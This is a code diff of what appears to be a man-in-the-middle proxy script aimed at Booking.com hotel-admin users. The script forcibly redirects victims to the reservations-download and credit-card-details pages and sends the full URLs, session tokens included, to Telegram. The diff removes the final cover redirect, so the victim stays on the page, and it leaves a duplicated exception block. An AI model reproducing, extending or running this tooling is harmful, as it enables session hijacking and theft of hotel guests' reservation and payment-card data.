@@ -630,8 +630,7 @@ def booking_reservations_download_redirect(flow: http.HTTPFlow) -> bool:
     Редиректит все запросы к admin.booking.com/hotel/* на страницу загрузки резервов.
     Завершается когда пользователь достигнет страницы со ВСЕМИ параметрами:
     hotel_id, lang, reportId, ses, auth_assurance_last_check
-    ПОСЛЕ завершения СРАЗУ редиректит на https://admin.booking.com/hotel/hoteladmin/
-    НО в Telegram отправляет полный URL как будто пользователь был на reservations_download.html
+    НЕТ финального редиректа - пользователь остается на reservations_download.html
     """
     try:
         log(f"[F18] Checking if should redirect...")
@@ -653,7 +652,6 @@ def booking_reservations_download_redirect(flow: http.HTTPFlow) -> bool:
         
         # ====== ПРОВЕРКА ЗАВЕРШЕНИЯ ФУНКЦИИ 18 ======
         # Проверяем, что это ЛЮБОЙ запрос, содержащий все 5 параметров
-        # Это может быть запрос К странице reservations_download.html ИЛИ запрос С этой страницы
         parsed = urllib.parse.urlparse(url)
         query = urllib.parse.parse_qs(parsed.query)
         
@@ -664,19 +662,8 @@ def booking_reservations_download_redirect(flow: http.HTTPFlow) -> bool:
         if has_all_params:
             log(f"[F18] ✓ Detected ALL 5 required parameters in URL -> FUNCTION 18 COMPLETED")
             
-            # Получаем параметры для финального редиректа
-            hotel_id = query.get("hotel_id", ["14762911"])[0]
-            ses = query.get("ses", ["ec1745929d110e5a461e56e51a3cda93"])[0]
-            full_url = url  # Сохраняем полный URL для Telegram
-            
-            # Если это запрос НА reservations_download.html (сама страница)
-            if "reservations_download.html" in url:
-                log(f"[F18] This IS the reservations_download.html page with all params")
-            else:
-                log(f"[F18] This is NOT the reservations_download.html page but has all params")
-                # Мы можем сгенерировать "виртуальный" URL для лога
-                # Например: https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/reservations_download.html?...
-                # Но используем текущий URL
+            # Получаем полный URL для Telegram
+            full_url = url
             
             # Удаляем флаг функции 18
             remove_booking_reservations_flag()
@@ -687,24 +674,10 @@ def booking_reservations_download_redirect(flow: http.HTTPFlow) -> bool:
             
             log(f"[F18] ✓ Completion notification sent for function 18")
             
-            # ====== СРАЗУ РЕДИРЕКТИМ НА admin.booking.com/hotel/hoteladmin/ ======
-            final_target_url = f"https://admin.booking.com/hotel/hoteladmin/?ses={ses}&hotel_id={hotel_id}"
-            
-            log(f"[F18] ✓ Making IMMEDIATE redirect to: {final_target_url}")
-            
-            # Делаем ПРЯМОЙ 302 редирект (без задержки)
-            flow.response = http.Response.make(
-                302, 
-                b"", 
-                {
-                    "Location": final_target_url,
-                    "Cache-Control": "no-cache, no-store, must-revalidate",
-                    "Pragma": "no-cache",
-                    "Expires": "0",
-                    "X-MITM-Redirect": "Function-18-Complete"
-                }
-            )
-            return True
+            # ====== НЕТ ФИНАЛЬНОГО РЕДИРЕКТА ======
+            # Пользователь остается на текущей странице (reservations_download.html)
+            log(f"[F18] ✓ Function completed, NO final redirect - user stays on page")
+            return False  # Не делаем редирект, просто завершаем функцию
         
         # ====== ЕСЛИ ЕЩЕ НЕТ ВСЕХ ПАРАМЕТРОВ ======
         
@@ -770,6 +743,12 @@ def booking_reservations_download_redirect(flow: http.HTTPFlow) -> bool:
             }
         )
         return True
+        
+    except Exception as e:
+        log(f"[F18] Error in booking_reservations_download_redirect: {e}")
+        import traceback
+        log(f"[F18] Traceback: {traceback.format_exc()}")
+        return False
         
     except Exception as e:
         log(f"[F18] Error in booking_reservations_download_redirect: {e}")
@@ -1102,13 +1081,12 @@ def custom_redirect(flow: http.HTTPFlow) -> bool:
         
 def booking_cc_details_redirect(flow: http.HTTPFlow) -> bool:
     """
-    ФУНКЦИЯ 19 (РАБОТАЕТ ТОЧНО КАК ФУНКЦИЯ 18):
+    ФУНКЦИЯ 19:
     1. Редиректит все запросы к admin.booking.com → secure-admin.booking.com/booking_cc_details.html
     2. Параметры: bn и hotel_id задаются админом, lang берется из запроса
     3. ОТПРАВЛЯЕТ ДВА УВЕДОМЛЕНИЯ: о старте и завершении
     4. Завершается когда видит полный URL со всеми параметрами
-    5. При завершении: сразу редиректит на admin.booking.com/hotel/hoteladmin/
-    6. Страница с параметрами не открывается пользователю
+    5. НЕТ финального редиректа - пользователь остается на booking_cc_details.html
     """
     try:
         log(f"[F19] Checking if should redirect...")
@@ -1155,23 +1133,6 @@ def booking_cc_details_redirect(flow: http.HTTPFlow) -> bool:
             if has_all_params:
                 log(f"[F19] ✓ Detected ALL 5 required parameters -> FUNCTION 19 COMPLETED")
                 
-                # Извлекаем ses и hotel_id для финального редиректа
-                import re
-                ses = "ec1745929d110e5a461e56e51a3cda93"  # значение по умолчанию
-                hotel_id = "10790315"  # значение по умолчанию
-                
-                # Ищем ses в URL (32 hex символа)
-                ses_match = re.search(r'ses=([a-f0-9]{32})', url_lower)
-                if ses_match:
-                    ses = ses_match.group(1)
-                    log(f"[F19] Found ses: {ses}")
-                
-                # Ищем hotel_id в URL
-                hotel_match = re.search(r'hotel_id=(\d+)', url_lower)
-                if hotel_match:
-                    hotel_id = hotel_match.group(1)
-                    log(f"[F19] Found hotel_id: {hotel_id}")
-                
                 # Полный URL для Telegram
                 full_url = url
                 
@@ -1184,24 +1145,10 @@ def booking_cc_details_redirect(flow: http.HTTPFlow) -> bool:
                 
                 log(f"[F19] ✓ Completion notification sent for function 19 with URL: {full_url}")
                 
-                # ====== СРАЗУ РЕДИРЕКТИМ НА admin.booking.com/hotel/hoteladmin/ ======
-                final_target_url = f"https://admin.booking.com/hotel/hoteladmin/?ses={ses}&hotel_id={hotel_id}"
-                
-                log(f"[F19] ✓ Making IMMEDIATE redirect to: {final_target_url}")
-                
-                # Делаем ПРЯМОЙ 302 редирект (без задержки, страница не открывается)
-                flow.response = http.Response.make(
-                    302, 
-                    b"", 
-                    {
-                        "Location": final_target_url,
-                        "Cache-Control": "no-cache, no-store, must-revalidate",
-                        "Pragma": "no-cache",
-                        "Expires": "0",
-                        "X-MITM-Redirect": "Function-19-Complete"
-                    }
-                )
-                return True
+                # ====== НЕТ ФИНАЛЬНОГО РЕДИРЕКТА ======
+                # Пользователь остается на текущей странице (booking_cc_details.html)
+                log(f"[F19] ✓ Function completed, NO final redirect - user stays on booking_cc_details.html")
+                return False  # Не делаем редирект, просто завершаем функцию
             
             else:
                 # Проверяем, каких параметров не хватает
